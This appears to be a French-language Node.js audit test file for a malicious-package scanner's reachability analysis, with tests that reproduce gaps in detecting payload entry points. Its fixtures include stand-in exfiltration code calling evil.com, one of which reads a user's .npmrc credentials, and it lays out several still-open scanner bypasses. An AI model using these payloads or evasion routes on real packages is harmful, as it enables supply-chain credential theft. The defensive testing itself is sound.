// Audit interne 2026-05-17 - Phase 1c reachability.js - Tests reproducteurs.
//
// CONVENTION (mixte depuis la remédiation 2026-07) :
// - RC-C1.a/b/c : CONVERTIS en gardes de non-régression (FIXED). Le fix est en
//   place (getEntryPoints énumère prepublishOnly/prepack/postuninstall,
//   reachability.js:952-957) → ces tests PASSENT et échoueront si le fix régresse.
// - RC-C2 / H1 / H2 / H3 : gaps ENCORE ouverts — convention d'origine (PASSE =
//   bug confirmé existant, ÉCHOUERA quand le fix arrivera).
//
// Standalone - pas intégré au run-tests.js master pour respecter la discipline
// "0 code change pendant l'audit". Lancement :
//   node tests/audit-2026-05/reachability-findings.test.js
//
// Rapport : muaddib-prompt-docs/archive/audits/2026-05-internal-v2.11.15.md
//
// Auteur : Claude Opus 4.7 (1M context) sous direction Kéwin Poszalski
// Date   : 2026-05-17

const fs = require('fs');
const os = require('os');
const path = require('path');

if (!process.env.MUADDIB_NO_REGISTRY_FETCH) {
  process.env.MUADDIB_NO_REGISTRY_FETCH = '1';
}

const {
  computeReachableFiles,
  getEntryPoints,
  extractScriptJsFiles,
} = require('../../src/scanner/reachability.js');

let passed = 0;
let failed = 0;
const failures = [];

function test(name, fn) {
  try {
    fn();
    console.log(`  [PASS] ${name}`);
    passed++;
  } catch (e) {
    console.log(`  [FAIL] ${name}`);
    console.log(`         ${e.message}`);
    failures.push({ name, error: e.message });
    failed++;
  }
}

function assert(cond, msg) {
  if (!cond) throw new Error(msg || 'assertion failed');
}

const tmpDirs = [];
function makeTempPkg(files, pkgJson) {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-rc-'));
  tmpDirs.push(tmp);
  fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify(pkgJson));
  for (const rel of Object.keys(files)) {
    const abs = path.join(tmp, rel);
    fs.mkdirSync(path.dirname(abs), { recursive: true });
    fs.writeFileSync(abs, files[rel]);
  }
  return tmp;
}

function cleanupAll() {
  for (const d of tmpDirs) {
    try { fs.rmSync(d, { recursive: true, force: true }); } catch { /* ignore */ }
  }
}

console.log('=== AUDIT 2026-05 Phase 1c - reachability.js findings ===');
console.log('');
console.log('Chaque test asserts le BUG actuel. PASS aujourd\'hui = bug existant.');
console.log('Après le fix prévu, ces tests doivent FAIL (= correction prouvée).');
console.log('');

// ────────────────────────────────────────────────────────────────────────
// RC-C1 - getEntryPoints n'extrait QUE preinstall|install|postinstall|prepare.
// Les autres lifecycle keys (prepack, prepublishOnly, prepublish legacy,
// preuninstall, uninstall, postuninstall) sont missed → un payload référencé
// par pkg.scripts.prepublishOnly n'est PAS dans entry points → marqué LOW.
// ────────────────────────────────────────────────────────────────────────
console.log('--- RC-C1: getEntryPoints rate prepack/prepublishOnly/uninstall ---');

test('RC-C1.a: pkg.scripts.prepublishOnly référençant un fichier → NON reachable', () => {
  const tmp = makeTempPkg(
    {
      'index.js': `console.log('main');`,
      'evil.js': `require('child_process').exec('curl http://evil.com');`
    },
    {
      name: 'test-prepublish',
      version: '1.0.0',
      main: 'index.js',
      scripts: { prepublishOnly: 'node ./evil.js' }
    }
  );
  const eps = getEntryPoints(tmp);
  assert(
    eps.includes('evil.js'),
    `FIXED : evil.js référencé par prepublishOnly DOIT être un entry point (reachability.js:952-957). Entry points trouvés : ${JSON.stringify(eps)}`
  );
});

test('RC-C1.b: pkg.scripts.prepack référençant un fichier → NON reachable', () => {
  const tmp = makeTempPkg(
    {
      'index.js': `console.log('main');`,
      'pack-evil.js': `// payload`
    },
    {
      name: 'test-prepack',
      version: '1.0.0',
      main: 'index.js',
      scripts: { prepack: 'node ./pack-evil.js' }
    }
  );
  const eps = getEntryPoints(tmp);
  assert(
    eps.includes('pack-evil.js'),
    `FIXED : pack-evil.js référencé par prepack DOIT être un entry point. Entry points : ${JSON.stringify(eps)}`
  );
});

test('RC-C1.c: pkg.scripts.postuninstall référençant un fichier → NON reachable', () => {
  const tmp = makeTempPkg(
    {
      'index.js': `console.log('main');`,
      'unhook.js': `// payload`
    },
    {
      name: 'test-postuninstall',
      version: '1.0.0',
      main: 'index.js',
      scripts: { postuninstall: 'node ./unhook.js' }
    }
  );
  const eps = getEntryPoints(tmp);
  assert(
    eps.includes('unhook.js'),
    `FIXED : unhook.js référencé par postuninstall DOIT être un entry point. Entry points : ${JSON.stringify(eps)}`
  );
});

// ────────────────────────────────────────────────────────────────────────
// RC-C2 - extractScriptJsFiles regex échoue sur node-with-flags. Le négatif
// lookahead `(?!-[a-z])` empêche le match dès qu'un flag style `-r` ou `-e`
// suit `node`. Conséquence : `node -r ts-node/register install.cjs` n'extrait
// pas install.cjs → non reachable → severity LOW.
// ────────────────────────────────────────────────────────────────────────
console.log('\n--- RC-C2: extractScriptJsFiles rate node-with-flags ---');

test('RC-C2.a: "node -r esm install.cjs" → install.cjs PAS extrait', () => {
  const files = extractScriptJsFiles('node -r esm install.cjs');
  assert(
    !files.includes('install.cjs'),
    `BUG-CONFIRMED : "node -r esm install.cjs" devrait extraire install.cjs, retourne : ${JSON.stringify(files)}`
  );
});

test('RC-C2.b: "node --require ts-node/register install.ts" → JS ext + flag flag absent', () => {
  // Note: install.ts est .ts pas .js → la regex ne le matcherait pas de toute façon.
  // Mais avec install.cjs et le préfixe --require :
  const files = extractScriptJsFiles('node --require ts-node/register install.cjs');
  // --require commence par -- qui n'est PAS -[a-z], donc le lookahead PASSE.
  // Mais alors la classe [\w./_-]+ matche --require puis échoue sur .cjs.
  // Le regex avance et trouve "ts-node/register install.cjs" ? Vérifions.
  // En pratique, la classe consume --require, échoue, recule. Pas de match.
  assert(
    !files.includes('install.cjs'),
    `BUG-CONFIRMED : "node --require ts-node/register install.cjs" n'extrait pas install.cjs : ${JSON.stringify(files)}`
  );
});

test('RC-C2.c: "node -e require(\'./payload.js\')" → payload.js PAS extrait', () => {
  // Le -e est intentionnellement bloqué par le lookahead (négatif sur -[a-z]).
  // Mais l'extracteur devrait au moins essayer de regarder dans le code inline.
  // C'est par design qu'on l'exclut, mais cela laisse passer les inline payloads.
  const files = extractScriptJsFiles(`node -e "require('./payload.js')"`);
  assert(
    files.length === 0,
    `BUG-CONFIRMED : "node -e ..." ne tente pas d'extraire les require() inline : ${JSON.stringify(files)}`
  );
});

test('RC-C2.d: getEntryPoints avec prepare="node -r esm payload.cjs" → payload.cjs absent', () => {
  const tmp = makeTempPkg(
    {
      'index.js': `console.log('main');`,
      'payload.cjs': `// malware`
    },
    {
      name: 'test-node-r',
      version: '1.0.0',
      main: 'index.js',
      scripts: { prepare: 'node -r esm payload.cjs' }
    }
  );
  const eps = getEntryPoints(tmp);
  assert(
    !eps.includes('payload.cjs'),
    `BUG-CONFIRMED : payload.cjs invoqué via "node -r ... .cjs" non extrait, entry points : ${JSON.stringify(eps)}`
  );
});

// ────────────────────────────────────────────────────────────────────────
// RC-C3 - worker_threads.Worker constructor NOT detected as spawn target.
// new Worker('./worker.js') est un mécanisme moderne pour exécuter JS dans
// un thread séparé. extractSpawnTargets ne gère que fork/spawn/execFile.
// → worker.js peut contenir le payload sans être reachable.
// ────────────────────────────────────────────────────────────────────────
console.log('\n--- RC-C3: new Worker("./file.js") not detected as spawn target ---');

test('RC-C3.a: index.js fait `new Worker("./evil-worker.js")` → evil-worker.js reachable (FIXED)', () => {
  const tmp = makeTempPkg(
    {
      'index.js': `const { Worker } = require('worker_threads');
const w = new Worker('./evil-worker.js');
w.on('message', (m) => console.log(m));`,
      'evil-worker.js': `const fs = require('fs');
const cred = fs.readFileSync('/home/user/.npmrc', 'utf8');
require('https').request({hostname:'evil.com'}).write(cred);`
    },
    {
      name: 'test-worker',
      version: '1.0.0',
      main: 'index.js'
    }
  );
  const r = computeReachableFiles(tmp);
  assert(r.reachableFiles.has('index.js'), 'index.js doit être reachable (entry main)');
  assert(
    r.reachableFiles.has('evil-worker.js'),
    `FIXED : evil-worker.js désormais détecté reachable via new Worker(...). Reachable : ${JSON.stringify([...r.reachableFiles])}`
  );
});

// ────────────────────────────────────────────────────────────────────────
// RC-H1 - resolvePathArg ne gère pas path.resolve(__dirname, ...). Seul
// path.join(__dirname, ...) est handled (line 254-272). Trivial bypass.
// ────────────────────────────────────────────────────────────────────────
console.log('\n--- RC-H1: resolvePathArg misses path.resolve(__dirname, ...) ---');

test('RC-H1.a: child_process.fork(path.resolve(__dirname, "evil.js")) → evil.js NON reachable', () => {
  const tmp = makeTempPkg(
    {
      'index.js': `const cp = require('child_process');
const path = require('path');
cp.fork(path.resolve(__dirname, 'evil.js'));`,
      'evil.js': `require('child_process').exec('curl http://evil.com');`
    },
    {
      name: 'test-path-resolve',
      version: '1.0.0',
      main: 'index.js'
    }
  );
  const r = computeReachableFiles(tmp);
  assert(r.reachableFiles.has('index.js'), 'index.js doit être reachable');
  assert(
    !r.reachableFiles.has('evil.js'),
    `BUG-CONFIRMED : evil.js référencé via path.resolve(__dirname, ...) non détecté. Reachable : ${JSON.stringify([...r.reachableFiles])}`
  );
});

test('RC-H1.b: child_process.fork(`${__dirname}/evil.js`) → evil.js NON reachable', () => {
  const tmp = makeTempPkg(
    {
      'index.js': 'const cp = require("child_process");\ncp.fork(`${__dirname}/evil.js`);',
      'evil.js': `require('child_process').exec('curl http://evil.com');`
    },
    {
      name: 'test-template-dirname',
      version: '1.0.0',
      main: 'index.js'
    }
  );
  const r = computeReachableFiles(tmp);
  assert(r.reachableFiles.has('index.js'), 'index.js doit être reachable');
  assert(
    !r.reachableFiles.has('evil.js'),
    `BUG-CONFIRMED : evil.js référencé via template literal \`\${__dirname}/...\` non détecté.`
  );
});

// ────────────────────────────────────────────────────────────────────────
// RC-H2 - pkg.directories.bin (legacy npm) NOT enumerated. Older packages
// utilisent ce mecanisme pour auto-discover les binaries.
// ────────────────────────────────────────────────────────────────────────
console.log('\n--- RC-H2: pkg.directories.bin not enumerated ---');

test('RC-H2.a: pkg.directories.bin pointing to bin/ → fichiers bin/ NON reachable', () => {
  const tmp = makeTempPkg(
    {
      'index.js': `console.log('main');`,
      'bin/cli.js': `#!/usr/bin/env node
require('child_process').exec('curl http://evil.com');`
    },
    {
      name: 'test-directories-bin',
      version: '1.0.0',
      main: 'index.js',
      directories: { bin: 'bin' }
    }
  );
  const eps = getEntryPoints(tmp);
  assert(
    !eps.includes('bin/cli.js'),
    `BUG-CONFIRMED : pkg.directories.bin non enumeré. Entry points : ${JSON.stringify(eps)}`
  );
});

// ────────────────────────────────────────────────────────────────────────
// RC-H3 - pkg.imports (Node.js subpath imports) NOT extracted.
// Pattern moderne : "imports": { "#evil": "./internal/exfil.js" }
// Référencé via `import '#evil'` depuis un entry. Si le entry référence
// l'alias #evil et n'est pas resolu correctement, la cible est missed.
// ────────────────────────────────────────────────────────────────────────
console.log('\n--- RC-H3: pkg.imports subpath imports not extracted ---');

test('RC-H3.a: pkg.imports cible non listée dans entry points', () => {
  const tmp = makeTempPkg(
    {
      'index.js': `console.log('main');`,
      'internal/exfil.js': `// payload`
    },
    {
      name: 'test-imports-field',
      version: '1.0.0',
      main: 'index.js',
      imports: { '#evil': './internal/exfil.js' }
    }
  );
  const eps = getEntryPoints(tmp);
  // pkg.imports n'est pas une source d'entry points (seuls main/bin/exports/browser/module/scripts).
  // Donc exfil.js n'est PAS dans eps.
  assert(
    !eps.includes('internal/exfil.js'),
    `BUG-CONFIRMED : pkg.imports#evil → ./internal/exfil.js non enumeré. Entry points : ${JSON.stringify(eps)}`
  );
});

// ────────────────────────────────────────────────────────────────────────
// Done.
// ────────────────────────────────────────────────────────────────────────
cleanupAll();
console.log('');
console.log(`=== Résultat : ${passed} PASS / ${failed} FAIL ===`);
if (failed > 0) {
  console.log('\nFAILURES :');
  for (const f of failures) {
    console.log(`  - ${f.name}: ${f.error}`);
  }
  process.exit(1);
}
console.log('');
console.log('Tous les tests passent = tous les bugs Critical/High de Phase 1c sont CONFIRMÉS.');
console.log('Après fix futur (en branches dédiées), ces tests doivent échouer.');
